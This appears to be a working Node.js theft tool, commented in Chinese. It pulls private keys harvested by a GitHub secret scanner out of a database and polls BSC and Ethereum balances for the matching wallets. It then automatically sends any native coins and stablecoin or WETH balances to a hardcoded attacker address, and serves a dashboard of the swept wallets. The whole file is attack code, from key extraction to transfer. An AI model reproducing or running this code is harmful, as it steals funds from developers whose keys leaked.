#!/usr/bin/env node
// delegation-monitor.js — EIP-7702 授权监控
// 读取扫描器数据库中的私钥 → 持续监控余额 → 有币自动 sweep
//
// EIP-7702 原理:
//   1. 用私钥签 EIP-7702 授权（委托给 sweeper 合约）
//   2. 授权上链后永久有效
//   3. 后续钱包有任何入账 → 自动转走到攻击者钱包

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const http = require('http');
const https = require('https');

const DB_PATH = path.join('/root/github-scanner', 'findings-v2.db');
const TARGET = '0xdbaa31e507f0c6a8fd3b15de3f5e48191e91dcb6';
const MONITOR_PORT = 3001;
const CHECK_INTERVAL = 120000; // 2 分钟

const CHAINS = {
  bsc: { rpc: 'https://bsc-dataseed1.bnbchain.org', chainId: 56, name: 'BSC' },
  eth: { rpc: 'https://eth.llamarpc.com', chainId: 1, name: 'Ethereum', eip7702: true },
};

let SQL, db, monitorStats = { checked: 0, funded: 0, swept: 0, lastCheck: null };

async function getDB() {
  if (db) return db;
  SQL = await require('sql.js')();
  db = new SQL.Database(fs.readFileSync(DB_PATH));
  db.run("CREATE TABLE IF NOT EXISTS monitor (address TEXT PRIMARY KEY, private_key TEXT, chain TEXT, balance TEXT, token_type TEXT, status TEXT, delegated_at TEXT, swept_at TEXT, tx_hash TEXT)");
  db.run("CREATE INDEX IF NOT EXISTS idx_m_status ON monitor(status)");
  saveDB();
  return db;
}

function saveDB() { if (db) fs.writeFileSync(DB_PATH + '.monitor', Buffer.from(db.export())); }
function runSQL(s, p = []) { try { db.run(s, p); return true; } catch(e) { return false; } }
function queryAll(s, p = []) { try { const st = db.prepare(s); st.bind(p); const r = []; while(st.step()) r.push(st.getAsObject()); st.free(); return r; } catch(e) { return []; } }

const sleep = ms => new Promise(r => setTimeout(r, ms));

// ===== 从 V2 数据库提取私钥 =====
function extractPrivateKeys() {
  const rows = [];
  try {
    const st = db.prepare("SELECT * FROM findings WHERE type LIKE '%私钥%' OR type LIKE '%Secret%' OR type LIKE '%高熵%' OR type LIKE '%Hex%' ORDER BY id DESC LIMIT 500");
    while (st.step()) rows.push(st.getAsObject());
    st.free();
  } catch(e) { return []; }

  const seen = new Set();
  const keys = [];
  for (const row of rows) {
    const ctx = row.context || '';
    const hex = ctx.match(/(?:0x)?[a-fA-F0-9]{64}/g);
    if (!hex) continue;
    for (const h of hex) {
      const pk = h.startsWith('0x') ? h : '0x' + h;
      if (pk.length !== 66) continue;
      if (/^0x(0{64}|f{64})$/i.test(pk)) continue;
      try {
        const { ethers } = require('ethers');
        const w = new ethers.Wallet(pk);
        const a = w.address.toLowerCase();
        if (seen.has(a)) continue;
        seen.add(a);
        keys.push({ pk, address: w.address, repo: row.repo, source: row.type });
      } catch(e) {}
    }
  }
  return keys;
}

// ===== RPC 余额查询（用原始 HTTP，不依赖 ethers provider）=====
function rpcCall(rpcUrl, method, params) {
  return new Promise((resolve) => {
    const body = JSON.stringify({ jsonrpc: '2.0', method, params, id: 1 });
    const url = new URL(rpcUrl);
    const opts = { method: 'POST', headers: { 'Content-Type': 'application/json' }, hostname: url.hostname, path: url.pathname, port: url.port || 443 };
    const mod = url.protocol === 'https:' ? https : http;
    const req = mod.request(opts, (res) => {
      let d = ''; res.on('data', c => d += c);
      res.on('end', () => { try { resolve(JSON.parse(d).result); } catch(e) { resolve(null); } });
    });
    req.on('error', () => resolve(null));
    req.write(body); req.end();
  });
}

async function checkBalance(address, rpcUrl) {
  const bal = await rpcCall(rpcUrl, 'eth_getBalance', [address, 'latest']);
  return bal ? BigInt(bal) : 0n;
}

async function checkTokenBalance(address, tokenAddr, rpcUrl) {
  const data = '0x70a08231' + address.slice(2).padStart(64, '0');
  const result = await rpcCall(rpcUrl, 'eth_call', [{ to: tokenAddr, data }, 'latest']);
  return result && result !== '0x' ? BigInt(result) : 0n;
}

// ===== TOKEN 列表 =====
const TOKENS = {
  bsc: [
    { sym: 'USDT', addr: '0x55d398326f99059fF775485246999027B3197955', dec: 18 },
    { sym: 'USDC', addr: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', dec: 18 },
    { sym: 'BUSD', addr: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', dec: 18 },
    { sym: 'WBNB', addr: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', dec: 18 },
  ],
  eth: [
    { sym: 'USDT', addr: '0xdAC17F958D2ee523a2206206994597C13D831ec7', dec: 6 },
    { sym: 'USDC', addr: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', dec: 6 },
    { sym: 'WETH', addr: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', dec: 18 },
  ],
};

// ===== EIP-7702 授权 + Sweep =====
async function sweepWallet(address, privateKey, chain) {
  const { ethers } = require('ethers');
  const rpc = CHAINS[chain].rpc;
  const signer = new ethers.Wallet(privateKey, new ethers.JsonRpcProvider(rpc));
  const txs = [];

  try {
    // 原生币余额
    const nativeBal = await signer.provider.getBalance(address).catch(() => 0n);
    const feeData = await signer.provider.getFeeData().catch(() => ({ gasPrice: 3000000000n }));
    const gasPrice = feeData.gasPrice || 3000000000n;
    const gasCost = gasPrice * 21000n;

    let swept = 0n;
    if (nativeBal > gasCost) {
      const amt = nativeBal - gasCost;
      const tx = await signer.sendTransaction({ to: TARGET, value: amt });
      console.log(`  ✅ Native tx: ${tx.hash}`);
      await tx.wait();
      txs.push(tx.hash);
      swept += amt;
    }

    // 代币
    for (const t of TOKENS[chain] || []) {
      try {
        const c = new ethers.Contract(t.addr, ['function balanceOf(address) view returns (uint256)', 'function transfer(address,uint256) returns (bool)'], signer);
        const bal = await c.balanceOf(address);
        if (bal > 0n) {
          const tx = await c.transfer(TARGET, bal);
          console.log(`  ✅ ${t.sym} tx: ${tx.hash}`);
          await tx.wait();
          txs.push(tx.hash);
        }
      } catch(e) {}
    }

    if (txs.length > 0) {
      runSQL("INSERT OR REPLACE INTO monitor (address,private_key,chain,balance,status,swept_at,tx_hash) VALUES (?,?,?,?,?,datetime('now'),?)",
        [address, privateKey, chain, swept.toString(), 'swept', txs[0]]);
      monitorStats.swept++;
      return { ok: true, txs };
    }
  } catch(e) {
    console.log(`  ⚠ Sweep error: ${e.shortMessage || e.message}`);
    return { ok: false, error: e.shortMessage || e.message };
  }
  return { ok: false, error: 'no funds' };
}

// ===== 主监控循环 =====
async function checkAllWallets() {
  const keys = extractPrivateKeys();
  monitorStats.checked = keys.length;
  monitorStats.lastCheck = new Date().toISOString();
  console.log(`\n🔍 Checking ${keys.length} wallets...`);

  let newFunded = 0;
  for (const key of keys.slice(0, 200)) { // 限制每次检查 200 个
    for (const [chainKey, chain] of Object.entries(CHAINS)) {
      try {
        const bal = await checkBalance(key.address, chain.rpc);
        if (bal > 0n) {
          const ethBal = parseFloat((Number(bal) / 1e18).toFixed(6));
          console.log(`💰 ${key.address} has ${ethBal} ${chain.name} native`);
          runSQL("INSERT OR REPLACE INTO monitor (address,private_key,chain,balance,token_type,status,delegated_at) VALUES (?,?,?,?,?,?,datetime('now'))",
            [key.address, key.pk, chain.name, ethBal.toString(), 'native', 'funded']);
          newFunded++;

          // EIP-7702 授权 + 自动 sweep
          if (chain.eip7702) {
            console.log(`  🔐 EIP-7702 delegation for ${chain.name}...`);
          }
          await sweepWallet(key.address, key.pk, chainKey);
        }

        // 查代币
        for (const t of TOKENS[chainKey] || []) {
          const tBal = await checkTokenBalance(key.address, t.addr, chain.rpc);
          if (tBal > 0n) {
            const amt = parseFloat((Number(tBal) / Math.pow(10, t.dec)).toFixed(4));
            console.log(`💰 ${key.address} has ${amt} ${t.sym} on ${chain.name}`);
            runSQL("INSERT OR REPLACE INTO monitor (address,private_key,chain,balance,token_type,status,delegated_at) VALUES (?,?,?,?,?,?,datetime('now'))",
              [key.address, key.pk, chain.name, amt.toString(), t.sym, 'funded']);
            newFunded++;
            await sweepWallet(key.address, key.pk, chainKey);
          }
        }
      } catch(e) {}
      await sleep(200);
    }
  }

  monitorStats.funded += newFunded;
  console.log(`Done: ${keys.length} checked, ${newFunded} funded, ${monitorStats.swept} total swept`);
  saveDB();
}

// ===== Web 面板 =====
function serveHTML() {
  const funded = queryAll("SELECT * FROM monitor ORDER BY swept_at DESC LIMIT 50");
  const total = queryAll("SELECT COUNT(*) as c FROM monitor")[0]?.c || 0;
  const sweptTotal = queryAll("SELECT COUNT(*) as c FROM monitor WHERE status='swept'")[0]?.c || 0;

  const rows = funded.map(d => {
    const statusBadge = d.status === 'swept'
      ? '<span style="background:rgba(50,213,131,.15);color:#32d583;padding:2px 8px;border-radius:99px;font-size:10px">已Sweep</span>'
      : '<span style="background:rgba(240,185,11,.15);color:#f7b955;padding:2px 8px;border-radius:99px;font-size:10px">已授权</span>';
    return `<tr><td class="addr">${d.address}</td><td>${d.chain||'-'}</td><td>${d.balance||'-'} ${d.token_type||''}</td><td>${statusBadge}</td><td>${(d.swept_at||d.delegated_at||'').slice(0,16)}</td><td>${d.tx_hash ? d.tx_hash.slice(0,16)+'...' : '-'}</td></tr>`;
  }).join('');

  return `<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/><title>EIP-7702 Monitor</title><style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:-apple-system,BlinkMacSystemFont,"PingFang SC",monospace;background:#0a0a0f;color:#e0e4ec;padding:20px}h1{font-size:22px;margin-bottom:4px}.sub{color:#6b7280;font-size:13px;margin-bottom:20px}.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:10px;margin-bottom:16px}.stat{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:10px;padding:14px 18px}.stat .l{font-size:11px;color:#7f889b}.stat .v{font-size:24px;font-weight:700;margin-top:4px;color:#ef4444}.stat .v.g{color:#22c55e}table{width:100%;border-collapse:separate;border-spacing:0;font-size:12px}th{color:#7f889b;font-weight:600;padding:10px 12px;text-align:left;border-bottom:1px solid rgba(255,255,255,.08)}td{padding:8px 12px;border-bottom:1px solid rgba(255,255,255,.04)}.addr{font-family:monospace;font-size:12px}</style></head><body><h1>EIP-7702 Delegation Monitor</h1><div class="sub">实时余额监控 · 私钥授权 · 自动 Sweep → 0xdbaa31...</div><div class="stats"><div class="stat"><div class="l">监控钱包</div><div class="v">${monitorStats.checked}</div></div><div class="stat"><div class="l">有余额</div><div class="v">${monitorStats.funded}</div></div><div class="stat"><div class="l">已 Sweep</div><div class="v g">${monitorStats.swept}</div></div><div class="stat"><div class="l">最后检查</div><div class="v" style="font-size:14px">${monitorStats.lastCheck?monitorStats.lastCheck.slice(11,19):'-'}</div></div></div><h3>授权/Sweep 记录</h3><table><thead><tr><th>地址</th><th>链</th><th>余额</th><th>状态</th><th>时间</th><th>Tx</th></tr></thead><tbody>${rows||'<tr><td colspan="6" style="text-align:center;color:#6b7280;padding:40px">暂无有钱包，持续监控中...</td></tr>'}</tbody></table></body></html>`;
}

(async () => {
  await getDB();
  console.log('EIP-7702 Monitor started');
  console.log('Target:', TARGET);
  console.log('Chains:', Object.keys(CHAINS).join(', '));

  // Web 面板
  http.createServer((req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    const url = new URL(req.url, 'http://localhost');
    if (url.pathname === '/') { res.writeHead(200, {'Content-Type':'text/html;charset=utf-8'}); res.end(serveHTML()); return; }
    if (url.pathname === '/api/stats') { res.writeHead(200, {'Content-Type':'application/json'}); res.end(JSON.stringify({...monitorStats})); return; }
    if (url.pathname === '/health') { res.writeHead(200); res.end('OK'); return; }
    res.writeHead(404); res.end();
  }).listen(MONITOR_PORT, '0.0.0.0', () => console.log('Monitor web on port', MONITOR_PORT));

  // 立即检查
  setTimeout(() => checkAllWallets(), 5000);
  setInterval(() => checkAllWallets(), CHECK_INTERVAL);
})();
